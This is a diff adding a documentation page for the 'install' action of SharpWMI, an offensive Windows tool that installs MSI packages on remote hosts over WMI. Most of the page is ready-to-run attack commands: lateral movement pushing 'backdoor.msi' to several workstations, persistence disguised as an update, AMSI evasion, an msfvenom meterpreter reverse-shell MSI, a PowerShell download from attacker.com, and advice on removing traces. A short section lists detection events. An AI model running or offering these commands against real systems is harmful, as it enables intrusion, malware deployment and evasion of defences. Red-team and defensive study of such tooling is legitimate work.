@@ -1,0 +1,390 @@
+---
+title: 'install'
+description: 'Install MSI packages remotely via WMI'
+icon: 'box'
+---
+
+## Overview
+
+The `install` action installs MSI (Microsoft Installer) packages on remote systems using the `Win32_Product.Install` WMI method. This enables remote software deployment without requiring interactive access.
+
+<Tip>
+  This feature was contributed by Justin Bui (@slyd0g) and provides a legitimate-looking method for deploying malicious MSI packages.
+</Tip>
+
+## Syntax
+
+```bash
+SharpWMI.exe action=install [computername=HOST[,HOST2,...]] path="MSI_FILE_PATH" [amsi=disable] [username=DOMAIN\user] [password=Password]
+```
+
+## Parameters
+
+| Parameter | Required | Description |
+|-----------|----------|-------------|
+| `action` | Yes | Must be `install` |
+| `path` | Yes | Path to MSI file (must be accessible from target) |
+| `computername` | No | Target host(s), comma-separated. Defaults to localhost |
+| `amsi` | No | Set to `disable` to bypass AMSI during installation |
+| `username` | No | Username for authentication |
+| `password` | No | Password for authentication |
+
+<Warning>
+  The MSI file must be accessible from the target system. Use UNC paths, local paths, or upload the file first.
+</Warning>
+
+## Usage Examples
+
+### Basic MSI Installation
+
+<CodeGroup>
+```bash UNC Path
+SharpWMI.exe action=install computername=target.domain.com path="\\fileserver\packages\software.msi"
+```
+
+```bash Local Path
+SharpWMI.exe action=install computername=target.domain.com path="C:\temp\installer.msi"
+```
+
+```bash With AMSI Evasion
+SharpWMI.exe action=install computername=target.domain.com path="C:\temp\package.msi" amsi=disable
+```
+
+```bash With Credentials
+SharpWMI.exe action=install computername=target.domain.com path="\\share\app.msi" username="DOMAIN\admin" password="Password123!"
+```
+</CodeGroup>
+
+### Example Output
+
+```
+[*] Host                           : target.domain.com
+[*] Path                           : C:\temp\installer.msi
+[*] Product install returned       : 0
+```
+
+**Return values:**
+- `0` = Success
+- Non-zero = Error code (see troubleshooting)
+
+## Operational Scenarios
+
+### Scenario 1: Upload and Install Malicious MSI
+
+```bash
+# 1. Upload MSI package
+SharpWMI.exe action=upload computername=target.domain.com source="malicious.msi" dest="C:\temp\installer.msi" amsi=disable
+
+# 2. Install the MSI
+SharpWMI.exe action=install computername=target.domain.com path="C:\temp\installer.msi" amsi=disable
+
+# 3. Clean up MSI file
+SharpWMI.exe action=exec computername=target.domain.com command="cmd /c del C:\temp\installer.msi" result=true
+```
+
+### Scenario 2: Network Share Deployment
+
+```bash
+# Install from network share
+SharpWMI.exe action=install computername=target.domain.com path="\\attacker-share\packages\payload.msi" amsi=disable username="DOMAIN\admin" password="Password123!"
+```
+
+### Scenario 3: Lateral Movement via MSI
+
+```bash
+# Deploy to multiple systems
+SharpWMI.exe action=install computername=ws01,ws02,ws03,ws04,ws05 path="\\fileserver\tools\backdoor.msi" amsi=disable username="DOMAIN\admin" password="Password123!"
+```
+
+### Scenario 4: Persistence Installation
+
+```bash
+# Upload persistence MSI
+SharpWMI.exe action=upload computername=target.domain.com source="persist.msi" dest="C:\Windows\Installer\update.msi" amsi=disable
+
+# Install for persistence
+SharpWMI.exe action=install computername=target.domain.com path="C:\Windows\Installer\update.msi" amsi=disable
+```
+
+## Creating Malicious MSI Files
+
+<Accordion title="MSI Payload Creation">
+  **Using msfvenom:**
+  ```bash
+  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f msi -o payload.msi
+  ```
+
+  **Using WiX Toolset:**
+  Create custom MSI with embedded payloads using WiX Toolset for more sophisticated installations.
+
+  **Custom Actions:**
+  MSI files support custom actions that execute during installation, providing opportunities for code execution.
+</Accordion>
+
+## MSI File Access
+
+The MSI file must be accessible from the target system:
+
+<Tabs>
+  <Tab title="UNC Path">
+    ```bash
+    # Requires network share access
+    path="\\fileserver\share\package.msi"
+    ```
+
+    **Advantages:**
+    - No file upload needed
+    - Centralized deployment
+    - Legitimate-looking paths
+
+    **Requirements:**
+    - SMB access to share
+    - Target can resolve UNC path
+    - Appropriate permissions
+  </Tab>
+
+  <Tab title="Local Path">
+    ```bash
+    # Requires file to be on target
+    path="C:\temp\installer.msi"
+    ```
+
+    **Advantages:**
+    - No network dependencies
+    - Faster installation
+    - Works if SMB blocked
+
+    **Requirements:**
+    - Upload file first (use upload action)
+    - File must exist at specified path
+  </Tab>
+
+  <Tab title="HTTP URL">
+    ```bash
+    # Not directly supported - download first
+    # Use PowerShell to download
+    SharpWMI.exe action=exec command="powershell -c \"Invoke-WebRequest -Uri http://attacker.com/payload.msi -OutFile C:\temp\payload.msi\"" result=true
+
+    # Then install
+    SharpWMI.exe action=install path="C:\temp\payload.msi" amsi=disable
+    ```
+  </Tab>
+</Tabs>
+
+## AMSI Evasion
+
+When `amsi=disable` is specified:
+
+1. Modifies registry: `HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable = 0`
+2. Executes MSI installation
+3. Restores original AMSI setting
+
+```bash
+SharpWMI.exe action=install computername=target.domain.com path="C:\temp\payload.msi" amsi=disable
+```
+
+## Remote vs Local Usage
+
+<Tabs>
+  <Tab title="Local Installation">
+    ```bash
+    SharpWMI.exe action=install path="C:\temp\installer.msi"
+    ```
+
+    **Use for:**
+    - Local testing
+    - Post-exploitation on compromised system
+  </Tab>
+
+  <Tab title="Remote Installation">
+    ```bash
+    SharpWMI.exe action=install computername=target.domain.com path="\\share\installer.msi" amsi=disable
+    ```
+
+    **Use for:**
+    - Lateral movement
+    - Multi-system deployment
+    - Remote persistence
+
+    **Requirements:**
+    - Admin privileges on target
+    - MSI file accessible from target
+  </Tab>
+</Tabs>
+
+## Detection Considerations
+
+<AccordionGroup>
+  <Accordion title="MSI Installation Detection" icon="radar">
+    - Event ID 1033: MsiInstaller installation beginning
+    - Event ID 1034: MsiInstaller installation completion
+    - Event ID 4688: Process creation (msiexec.exe)
+    - Sysmon Event ID 1: msiexec.exe spawned by wmiprvse.exe
+  </Accordion>
+
+  <Accordion title="WMI Detection" icon="network-wired">
+    - Win32_Product.Install method invocation
+    - Event ID 5857: WMI activity
+    - Sysmon Event ID 19-21: WMI operations
+    - Remote WMI installation operations
+  </Accordion>
+
+  <Accordion title="File System Detection" icon="folder">
+    - MSI file creation in suspicious locations
+    - Installation from temp directories
+    - UNC paths from unknown sources
+    - MSI files in user-writable locations
+  </Accordion>
+
+  <Accordion title="Behavioral Detection" icon="brain">
+    - Unsigned MSI installations
+    - MSI from non-standard locations
+    - Installations by non-administrative processes
+    - Installations outside change windows
+  </Accordion>
+</AccordionGroup>
+
+## Best Practices
+
+<CardGroup cols={2}>
+  <Card title="MSI Preparation" icon="file">
+    - Code sign MSI if possible
+    - Use legitimate-looking metadata
+    - Test installation locally first
+    - Keep MSI size reasonable
+  </Card>
+
+  <Card title="Operational Security" icon="user-secret">
+    - Always use `amsi=disable`
+    - Clean up MSI files after install
+    - Use UNC paths when possible
+    - Monitor for installation failures
+  </Card>
+
+  <Card title="Path Selection" icon="map">
+    - Use legitimate-looking paths
+    - Avoid temp directories if possible
+    - Consider Windows\Installer directory
+    - Match existing package paths
+  </Card>
+
+  <Card title="Post-Installation" icon="broom">
+    - Verify installation succeeded
+    - Remove MSI file
+    - Check installed programs list
+    - Verify payload execution
+  </Card>
+</CardGroup>
+
+## Installation Options
+
+The `install` action uses default MSI installation options:
+
+```
+AllUsers = true
+Options = ""
+PackageLocation = <path>
+```
+
+For custom installation options, use `exec` action with `msiexec`:
+
+```bash
+SharpWMI.exe action=exec computername=target command="msiexec /i C:\temp\installer.msi /quiet /norestart" result=true
+```
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Product Install Returned: Non-Zero">
+    **Cause:** Installation failed
+
+    **Common error codes:**
+    - `1602`: User cancelled installation
+    - `1603`: Fatal error during installation
+    - `1619`: Package could not be opened
+    - `1625`: Installation forbidden by policy
+
+    **Solution:**
+    - Check MSI file is accessible
+    - Verify file is valid MSI
+    - Check for Group Policy restrictions
+    - Review installation logs
+  </Accordion>
+
+  <Accordion title="Access Denied">
+    **Cause:** Insufficient privileges
+
+    **Solution:**
+    - Verify admin credentials
+    - Use `username` and `password` parameters
+    - Check UAC remote restrictions
+    - Ensure user can install software
+  </Accordion>
+
+  <Accordion title="Package Not Found">
+    **Cause:** Path inaccessible from target
+
+    **Solution:**
+    - Verify UNC path is accessible
+    - Check SMB connectivity
+    - Upload file locally first
+    - Test path from target system
+  </Accordion>
+
+  <Accordion title="Installation Hangs">
+    **Cause:** UI prompts or long installation
+
+    **Solution:**
+    - Use silent installation options
+    - Increase timeout if possible
+    - Check for interactive prompts
+    - Use msiexec with /quiet flag
+  </Accordion>
+</AccordionGroup>
+
+## Verification
+
+Verify MSI installation succeeded:
+
+```bash
+# List installed products
+SharpWMI.exe action=query computername=target.domain.com query="SELECT Name,Version FROM Win32_Product WHERE Name LIKE '%ProductName%'"
+
+# Check processes
+SharpWMI.exe action=ps computername=target.domain.com
+
+# Verify files exist
+SharpWMI.exe action=exec computername=target.domain.com command="cmd /c dir \"C:\Program Files\Application\"" result=true
+```
+
+## Related Actions
+
+<CardGroup cols={2}>
+  <Card title="upload" icon="upload" href="/ghostpack-docs/SharpWMI-mdx/actions/upload">
+    Upload MSI files before installation
+  </Card>
+  <Card title="exec" icon="terminal" href="/ghostpack-docs/SharpWMI-mdx/actions/exec">
+    Execute msiexec with custom options
+  </Card>
+  <Card title="query" icon="database" href="/ghostpack-docs/SharpWMI-mdx/actions/query">
+    Verify installation
+  </Card>
+  <Card title="ps" icon="list" href="/ghostpack-docs/SharpWMI-mdx/actions/ps">
+    Check for installed processes
+  </Card>
+</CardGroup>
+
+## Alternative Installation
+
+<Accordion title="Using msiexec Directly">
+  ```bash
+  # Silent installation
+  SharpWMI.exe action=exec computername=target command="msiexec /i C:\temp\installer.msi /quiet /norestart /l*v C:\temp\install.log" result=true
+
+  # Unattended with no UI
+  SharpWMI.exe action=exec computername=target command="msiexec /i \\share\app.msi /qn /norestart" result=true
+
+  # With properties
+  SharpWMI.exe action=exec computername=target command="msiexec /i C:\temp\app.msi /quiet INSTALLDIR=\"C:\CustomPath\" PROPERTY=VALUE" result=true
+  ```
+</Accordion>
